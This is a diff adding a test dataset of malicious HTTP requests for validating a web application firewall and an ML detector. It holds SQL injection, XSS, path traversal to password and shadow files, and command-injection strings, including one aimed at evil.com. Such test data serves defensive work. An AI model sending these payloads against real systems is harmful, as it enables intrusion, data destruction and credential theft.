@@ -1,0 +1,79 @@
+# ============================================================================
+# DWAF Malicious Request Test Dataset
+# Attack Categories: SQL Injection, XSS, Path Traversal, Command Injection
+# Format:
+#   METHOD URL [BODY]
+#
+# Used for:
+# - ML detector testing
+# - WAF rule validation
+# - ZKP pipeline verification
+# ============================================================================
+
+
+# ── Classic SQL Injection ───────────────────────────────────────────────────
+GET /login?username=admin'--&password=anything
+GET /search?q=' OR '1'='1
+GET /user?id=1 UNION SELECT username,password FROM users--
+GET /item?id=1; DROP TABLE users;--
+GET /page?id=1' AND SLEEP(5)--
+GET /product?id=1 OR 1=1--
+GET /auth?user=admin'/*
+GET /data?id=1' UNION SELECT null,null,null--
+GET /search?q=1' ORDER BY 3--
+GET /login?user=1' AND '1'='1
+GET /profile?id=1' OR 'a'='a
+GET /account?id=1 OR 1=1#
+
+# ── Blind / Time-Based SQL Injection ────────────────────────────────────────
+GET /login?id=1' AND SLEEP(5)--
+GET /product?id=10 AND IF(1=1,SLEEP(5),0)
+GET /search?q=1' AND BENCHMARK(1000000,MD5(1))--
+GET /user?id=5' WAITFOR DELAY '0:0:5'--
+
+# ── URL Encoded SQL Injection ───────────────────────────────────────────────
+GET /anadir.jsp?id=2&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos
+GET /search?q=%27+OR+%271%27%3D%271
+GET /item?id=1%27+UNION+SELECT+username%2Cpassword+FROM+users--
+GET /login?user=%27+OR+1%3D1--
+GET /page?id=1%27+AND+SLEEP%285%29--
+GET /data?id=%27%20UNION%20SELECT%20null,null,null--
+
+# ── POST Body SQL Injection ─────────────────────────────────────────────────
+POST /login username=admin'--&password=x
+POST /search q=' OR '1'='1'&submit=Search
+POST /register email=test@test.com'&name=John
+POST /update id=1;+DROP+TABLE+users--&value=test
+POST /profile id=1' OR '1'='1'&update=true
+
+# ── Cross-Site Scripting (XSS) ──────────────────────────────────────────────
+GET /search?q=<script>alert('xss')</script>
+GET /page?title=<img src=x onerror=alert(1)>
+GET /user?name=<svg onload=alert(document.cookie)>
+GET /comment?text=javascript:alert(1)
+GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+GET /profile?bio=<iframe src="javascript:alert(1)">
+GET /msg?text=<body onload=alert('XSS')>
+
+# ── Path Traversal / File Disclosure ────────────────────────────────────────
+GET /file?path=../../etc/passwd
+GET /download?file=../../../windows/system32/config/sam
+GET /read?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+GET /view?doc=....//....//etc/passwd
+GET /logs?file=../../../../var/log/auth.log
+GET /backup?file=../../../etc/shadow
+
+# ── Command Injection ───────────────────────────────────────────────────────
+GET /ping?host=localhost;cat+/etc/passwd
+GET /exec?cmd=ls+-la+/etc
+GET /run?input=test|whoami
+GET /check?url=http://evil.com/`id`
+GET /admin?cmd=whoami;uname+-a
+GET /test?host=8.8.8.8&&cat+/etc/passwd
+GET /debug?cmd=$(id)
+
+# ── Mixed / Obfuscated Payloads ─────────────────────────────────────────────
+GET /search?q='/**/OR/**/'1'='1
+GET /login?user=admin'--+&password=test
+GET /item?id=1/**/UNION/**/SELECT/**/1,2,3--
+GET /profile?id=1'%20OR%20'1'%3D'1
